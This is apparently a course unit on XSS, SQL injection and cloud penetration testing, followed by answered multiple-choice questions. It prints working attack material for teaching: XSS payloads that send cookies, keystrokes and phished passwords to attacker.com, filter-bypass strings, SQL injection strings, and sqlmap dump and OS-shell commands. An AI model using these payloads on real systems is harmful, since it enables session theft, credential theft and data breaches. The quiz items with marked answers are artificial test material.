# Unit 5: XSS Vulnerabilities, SQL Injection & Cloud Penetration Testing

---

## Part A: XSS Vulnerabilities Identification

---

## 5.1 Understanding XSS Vulnerabilities

### What is XSS?
**Cross-Site Scripting (XSS)** is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. The scripts execute in the context of the victim's browser session.

### Where to Find XSS Vulnerabilities:
- **Search boxes** – Reflected input in search results
- **Comment fields** – Stored content displayed to other users
- **URL parameters** – Data reflected from query strings
- **Form fields** – Input reflected in error messages or confirmation pages
- **User profile fields** – Name, bio, location displayed on pages
- **HTTP headers** – Referer, User-Agent reflected on pages
- **File upload names** – Filenames displayed on the page
- **Error messages** – User input reflected in error output

---

## 5.2 Identifying XSS Vulnerabilities

### Manual Testing Steps:
1. **Identify input points** – Find all places where user input is accepted
2. **Test with basic payloads** – Inject `<script>alert('XSS')</script>`
3. **Observe output** – Check if the script executes
4. **Test context** – HTML context, attribute context, JavaScript context
5. **Try bypass techniques** – Encoding, case variation, alternative tags

### Testing Payloads:

#### Basic Payloads:
```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>
```

#### Filter Bypass Payloads:
```html
<ScRiPt>alert('XSS')</ScRiPt>                    <!-- Case variation -->
<scr<script>ipt>alert('XSS')</script>             <!-- Nested tags -->
<img src=x onerror=alert&#40;'XSS'&#41;>          <!-- HTML entity encoding -->
<img src=x onerror="&#x61;lert('XSS')">           <!-- Hex encoding -->
javascript:alert('XSS')                            <!-- Protocol handler -->
<svg/onload=alert('XSS')>                          <!-- No space needed -->
```

---

## 5.3 XSS Exploitation Techniques

### Cookie Stealing:
```javascript
<script>
  new Image().src="http://attacker.com/steal.php?cookie="+document.cookie;
</script>
```

### Session Hijacking:
```javascript
<script>
  document.location='http://attacker.com/grab.php?session='+document.cookie;
</script>
```

### Keylogging:
```javascript
<script>
  document.onkeypress = function(e) {
    new Image().src="http://attacker.com/log.php?key="+e.key;
  }
</script>
```

### Phishing via XSS:
```javascript
<script>
  document.body.innerHTML='<h1>Session Expired</h1><form action="http://attacker.com/phish.php"><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><button>Login</button></form>';
</script>
```

### Defacement:
```javascript
<script>
  document.body.innerHTML='<h1>Hacked by XSS!</h1>';
</script>
```

### XSS Testing Tools:
| Tool | Description |
|---|---|
| **XSSer** | Automated XSS detection and exploitation framework |
| **XSStrike** | Advanced XSS detection with fuzzing |
| **OWASP ZAP** | Automated XSS scanning |
| **Burp Suite** | Manual and automated XSS testing |
| **DOMPurify** | Client-side XSS sanitization library |
| **BeEF** | Browser exploitation after XSS hook |

---

## Part B: SQL Injection (Detailed)

---

## 5.4 Introduction to SQL Injection

### How SQL Injection Works:

**Normal Query:**
```sql
SELECT * FROM users WHERE username='admin' AND password='password123';
```

**Injected Query:**
```sql
SELECT * FROM users WHERE username='' OR 1=1 --' AND password='anything';
```
The `OR 1=1` always evaluates to TRUE, and `--` comments out the rest of the query.

### SQL Injection Attack Flow:
1. **Identify injection points** – Login forms, search boxes, URL parameters
2. **Test for vulnerability** – Enter `'` and look for errors
3. **Determine database type** – MySQL, MSSQL, Oracle, PostgreSQL
4. **Extract data** – Use UNION, error-based, or blind techniques
5. **Escalate privileges** – Access admin functions, file system

---

## 5.5 Manual SQL Injection Techniques

### Authentication Bypass:
```sql
' OR 1=1 --
' OR '1'='1
admin' --
' OR 1=1 #           (MySQL)
' OR 1=1 /*
```

### Union-Based Injection:
```sql
-- Step 1: Determine number of columns
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --      (increment until error)

-- Step 2: Find displayable columns
' UNION SELECT 1,2,3 --

-- Step 3: Extract database info
' UNION SELECT 1,version(),database() --

-- Step 4: Extract table names
' UNION SELECT 1,table_name,3 FROM information_schema.tables --

-- Step 5: Extract column names
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' --

-- Step 6: Extract data
' UNION SELECT 1,username,password FROM users --
```

### Error-Based Injection:
```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --
' AND extractvalue(1,concat(0x7e,(SELECT version()))) --
```

### Blind SQL Injection:
```sql
-- Boolean-based
' AND 1=1 --    (TRUE - normal response)
' AND 1=2 --    (FALSE - different response)
' AND SUBSTRING(database(),1,1)='a' --

-- Time-based
' AND SLEEP(5) --            (MySQL)
'; WAITFOR DELAY '0:0:5' --  (MSSQL)
' AND pg_sleep(5) --         (PostgreSQL)
```

---

## 5.6 Automated SQL Injection using SQLmap

### What is SQLmap?
SQLmap is an open-source tool that automates the detection and exploitation of SQL injection vulnerabilities.

### Basic SQLmap Commands:
```bash
# Basic test
sqlmap -u "http://target.com/page.php?id=1"

# Specify database
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Get tables from a specific database
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Get columns from a specific table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# Dump data from a table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump

# POST request injection
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass"

# With cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc123"

# OS shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# Specific technique
sqlmap -u "http://target.com/page.php?id=1" --technique=U  # Union-based only
```

### SQLmap Techniques:

| Flag | Technique |
|---|---|
| `B` | Boolean-based blind |
| `E` | Error-based |
| `U` | Union query-based |
| `S` | Stacked queries |
| `T` | Time-based blind |
| `Q` | Inline queries |

---

## Part C: Cloud Penetration Testing

---

## 5.7 Cloud Attack Surfaces

### Cloud Service Models:

| Model | Description | Customer Responsibility |
|---|---|---|
| **IaaS (Infrastructure as a Service)** | Virtual machines, storage, networking (AWS EC2, Azure VMs) | OS, apps, data, middleware |
| **PaaS (Platform as a Service)** | Development platforms (Google App Engine, Azure App Service) | Apps and data |
| **SaaS (Software as a Service)** | Complete applications (Gmail, Office 365, Salesforce) | Data and user access |

### Shared Responsibility Model:
- **Cloud Provider** is responsible for security **OF** the cloud (physical infrastructure, hypervisor)
- **Customer** is responsible for security **IN** the cloud (data, applications, access management)

### Common Cloud Attack Surfaces:

| Attack Surface | Description |
|---|---|
| **IAM Misconfigurations** | Overly permissive roles, weak policies |
| **Exposed Storage** | Publicly accessible S3 buckets, Blob storage |
| **Insecure APIs** | Poorly secured REST APIs |
| **Serverless Functions** | Lambda/Azure Functions with excessive permissions |
| **Container Vulnerabilities** | Misconfigured Docker/Kubernetes |
| **Network Misconfigurations** | Open security groups, exposed ports |
| **Metadata Services** | Instance metadata (169.254.169.254) accessible to attackers |
| **Logging Gaps** | Insufficient CloudTrail/CloudWatch logging |

---

## 5.8 IAM Privilege Escalation

### What is IAM?
**Identity and Access Management (IAM)** controls who has access to what resources in the cloud.

### IAM Privilege Escalation Techniques:

#### AWS:
| Technique | Description |
|---|---|
| **Overpermissioned IAM Policies** | Users with `*` permissions or admin access |
| **IAM Role Assumption** | Assuming a more privileged role via `sts:AssumeRole` |
| **Policy Attachment** | Attaching admin policies to own user/role |
| **Lambda Privilege Escalation** | Creating Lambda functions with higher privileges |
| **EC2 Instance Profile Abuse** | Leveraging IAM roles attached to EC2 instances |
| **CloudFormation Abuse** | Creating stacks with elevated permissions |
| **Access Key Exposure** | Hardcoded keys in source code or config files |

#### Azure:
| Technique | Description |
|---|---|
| **Role Assignments** | Granting Owner/Contributor roles excessively |
| **Managed Identity Abuse** | Exploiting Azure Managed Identities |
| **Subscription Escalation** | Moving to higher privilege subscriptions |
| **Service Principal Abuse** | Leveraging service principals with excessive permissions |

### IAM Pentesting Tools:

| Tool | Platform | Purpose |
|---|---|---|
| **Pacu** | AWS | AWS exploitation framework |
| **ScoutSuite** | Multi-cloud | Cloud security auditing |
| **Prowler** | AWS | AWS security assessment |
| **CloudSploit** | Multi-cloud | Cloud security scanning |
| **enumerate-iam** | AWS | Enumerate IAM permissions |
| **WeirdAAL** | AWS | AWS attack library |

---

## 5.9 S3 Bucket Enumeration

### What are S3 Buckets?
Amazon S3 (Simple Storage Service) buckets are cloud storage containers. Misconfigured buckets can expose sensitive data.

### Common S3 Misconfigurations:
- **Public Read** – Anyone can list and download objects
- **Public Write** – Anyone can upload files
- **Public ACL** – Access Control Lists allow public access
- **Bucket Policy Issues** – Overly permissive policies

### S3 Enumeration Techniques:
```bash
# Check if bucket exists and is accessible
aws s3 ls s3://bucket-name
aws s3 ls s3://bucket-name --no-sign-request

# List all objects
aws s3 ls s3://bucket-name --recursive

# Download all files
aws s3 sync s3://bucket-name ./local-folder

# Check bucket ACL
aws s3api get-bucket-acl --bucket bucket-name

# Check bucket policy
aws s3api get-bucket-policy --bucket bucket-name
```

### S3 Enumeration Tools:

| Tool | Purpose |
|---|---|
| **S3Scanner** | Scans for open S3 buckets |
| **AWSBucketDump** | Enumerates AWS S3 buckets |
| **Bucket Finder** | Discovers publicly accessible buckets |
| **LazyS3** | Brute-force S3 bucket names |
| **GrayhatWarfare** | Search engine for open S3 buckets |
| **cloud_enum** | Multi-cloud storage enumeration |

### Azure Storage Equivalent:
- **Azure Blob Storage** – Similar to S3 buckets
- **Misconfigured containers** can also be publicly accessible
- Tool: **MicroBurst** – Azure security assessment

---

## MCQ Practice Questions

---

**Q1.** Which type of XSS vulnerability persists on the server and affects all users who view the page?

A. Reflected XSS  
**B. Stored XSS** ✅  
C. DOM-based XSS  
D. Self XSS

> **Explanation:** Stored XSS saves the malicious script in the server's database, affecting every user who views the compromised page.

---

**Q2.** What is the primary purpose of SQLmap?

A. Network scanning  
B. Password cracking  
**C. Automated SQL injection detection and exploitation** ✅  
D. Web application proxying

> **Explanation:** SQLmap automates the process of detecting and exploiting SQL injection vulnerabilities in web applications.

---

**Q3.** Which SQLmap flag is used to list all databases?

A. `--tables`  
**B. `--dbs`** ✅  
C. `--columns`  
D. `--dump`

> **Explanation:** The `--dbs` flag tells SQLmap to enumerate all databases on the target.

---

**Q4.** In cloud computing, who is responsible for security "IN" the cloud?

A. Cloud provider  
**B. Customer** ✅  
C. Third-party auditor  
D. Both equally

> **Explanation:** The Shared Responsibility Model states: the provider secures the cloud infrastructure; the customer secures their data, applications, and access.

---

**Q5.** Which AWS tool is used as an exploitation framework for penetration testing?

**A. Pacu** ✅  
B. Nmap  
C. Metasploit  
D. Burp Suite

> **Explanation:** Pacu is an open-source AWS exploitation framework designed specifically for testing AWS environments.

---

**Q6.** A misconfigured S3 bucket with public read access means:

A. Only the bucket owner can access files  
B. Only authenticated AWS users can access files  
**C. Anyone on the internet can list and download files** ✅  
D. Files are encrypted and inaccessible

> **Explanation:** Public read access on an S3 bucket allows anyone to list objects and download files without authentication.

---

**Q7.** Which SQL injection technique uses the `SLEEP()` function to extract data?

A. Error-based SQLi  
B. Union-based SQLi  
C. Boolean-based Blind SQLi  
**D. Time-based Blind SQLi** ✅

> **Explanation:** Time-based Blind SQLi uses time delay functions like `SLEEP()` (MySQL) or `WAITFOR DELAY` (MSSQL) to infer data.

---

**Q8.** Which cloud service model gives the customer the MOST responsibility for security?

**A. IaaS (Infrastructure as a Service)** ✅  
B. PaaS (Platform as a Service)  
C. SaaS (Software as a Service)  
D. All models have equal responsibility

> **Explanation:** In IaaS, the customer is responsible for the OS, applications, data, and middleware – the most responsibility.

---

**Q9.** What payload would you use to test if a search box is vulnerable to Reflected XSS?

**A. `<script>alert('XSS')</script>`** ✅  
B. `' OR 1=1 --`  
C. `admin' --`  
D. `nmap -sS target`

> **Explanation:** The basic `<script>alert('XSS')</script>` payload tests if the input is reflected and executed in the browser.

---

**Q10.** Which IAM privilege escalation technique involves assuming a more privileged role?

A. Policy Attachment  
**B. IAM Role Assumption (sts:AssumeRole)** ✅  
C. Access Key Exposure  
D. Lambda Abuse

> **Explanation:** The `sts:AssumeRole` API allows users to temporarily assume a different role, potentially escalating privileges.

---

**Q11.** In SQL injection, what does `--` do?

A. Starts a new query  
**B. Comments out the rest of the SQL query** ✅  
C. Concatenates strings  
D. Performs a join operation

> **Explanation:** `--` is a SQL comment marker that tells the database to ignore everything after it on that line.

---

**Q12.** Which command checks if an S3 bucket is publicly accessible without credentials?

A. `aws s3 ls s3://bucket-name`  
**B. `aws s3 ls s3://bucket-name --no-sign-request`** ✅  
C. `aws s3 sync s3://bucket-name`  
D. `aws s3api get-bucket-acl`

> **Explanation:** The `--no-sign-request` flag sends the request without AWS credentials, simulating anonymous access.

---

**Q13.** DOM-based XSS differs from other XSS types because:

A. It is more persistent  
B. It requires SQL injection  
**C. It executes entirely in the browser without server involvement** ✅  
D. It only works on mobile devices

> **Explanation:** DOM-based XSS manipulates the browser's Document Object Model directly, without sending the payload to the server.

---

**Q14.** What is the cloud metadata service IP address commonly targeted in SSRF attacks?

A. 192.168.1.1  
B. 10.0.0.1  
**C. 169.254.169.254** ✅  
D. 127.0.0.1

> **Explanation:** The metadata service at 169.254.169.254 is a well-known target in cloud SSRF attacks, as it can expose IAM credentials and other sensitive information.

---

**Q15.** Which SQLmap flag is used to specify a POST request with form data?

A. `--cookie`  
**B. `--data`** ✅  
C. `--forms`  
D. `--method`

> **Explanation:** The `--data` flag allows you to specify POST parameters for SQLmap to test.

---

**Q16.** A penetration tester finds that entering `'` in a login field causes a database error message. What does this indicate?

A. The application is secure  
**B. The application may be vulnerable to SQL injection** ✅  
C. The database is offline  
D. The application uses prepared statements

> **Explanation:** A database error triggered by a single quote suggests the input is being directly inserted into an SQL query without sanitization.

---

**Q17.** Which tool is used for multi-cloud security auditing?

A. Pacu  
**B. ScoutSuite** ✅  
C. Prowler  
D. enumerate-iam

> **Explanation:** ScoutSuite supports multiple cloud providers (AWS, Azure, GCP) for comprehensive security auditing.

---

**Q18.** To prevent XSS attacks, which HTTP header restricts the sources from which scripts can be loaded?

A. X-Frame-Options  
**B. Content-Security-Policy** ✅  
C. X-Content-Type-Options  
D. Strict-Transport-Security

> **Explanation:** Content-Security-Policy (CSP) allows web servers to specify which sources can execute scripts, effectively preventing XSS.

---

**Q19.** What does `' UNION SELECT 1,2,3 --` help determine in SQL injection?

A. The database version  
**B. The number of columns in the query** ✅  
C. The table names  
D. The password hash

> **Explanation:** UNION SELECT with numbered columns helps determine how many columns the original query returns, which is required for UNION-based injection.

---

**Q20.** What is the Azure equivalent of AWS S3 storage?

A. Azure Files  
**B. Azure Blob Storage** ✅  
C. Azure Queue  
D. Azure Table Storage

> **Explanation:** Azure Blob Storage is functionally equivalent to AWS S3, providing object storage for unstructured data.

---
